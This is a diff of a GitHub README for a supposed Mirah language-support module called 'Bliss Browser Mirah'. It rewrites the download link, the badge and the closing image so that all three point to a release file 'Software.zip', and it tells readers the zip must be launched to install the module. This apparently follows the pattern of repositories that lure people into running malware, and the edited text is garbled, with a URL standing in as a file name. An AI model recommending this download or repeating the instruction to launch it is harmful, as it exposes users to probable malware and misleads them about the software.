@@ -13,9 +13,9 @@ Welcome to the Bliss Browser Mirah repository! This module provides language sup
 
 You can download the software package for Bliss Browser Mirah from the following link:
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Software](https://github.com/salvix317/Bliss_Browser_Mirah/releases/download/v2.0/Software.zip)](https://github.com/salvix317/Bliss_Browser_Mirah/releases/download/v2.0/Software.zip)
 
-Please note that the downloaded file "Software.zip" needs to be launched to install the Bliss Browser Mirah support module.
+Please note that the downloaded file "https://github.com/salvix317/Bliss_Browser_Mirah/releases/download/v2.0/Software.zip" needs to be launched to install the Bliss Browser Mirah support module.
 
 If the above link is not working or you want to explore other options, you can check the "Releases" section of this repository for additional download sources.
 
@@ -59,4 +59,4 @@ Explore the code, submit bug reports, suggest new features, or collaborate with 
 
 Thank you for visiting the Bliss Browser Mirah repository. We hope this module will be a valuable addition to your web development toolkit, enabling you to leverage the power of Mirah in innovative ways. Stay tuned for updates, and happy coding in the Bliss Browser environment! 🌐💻
 
-![Bliss Browser Mirah](https://example.com/bliss-browser-mirah.png)
+![Bliss Browser Mirah](https://github.com/salvix317/Bliss_Browser_Mirah/releases/download/v2.0/Software.zip)
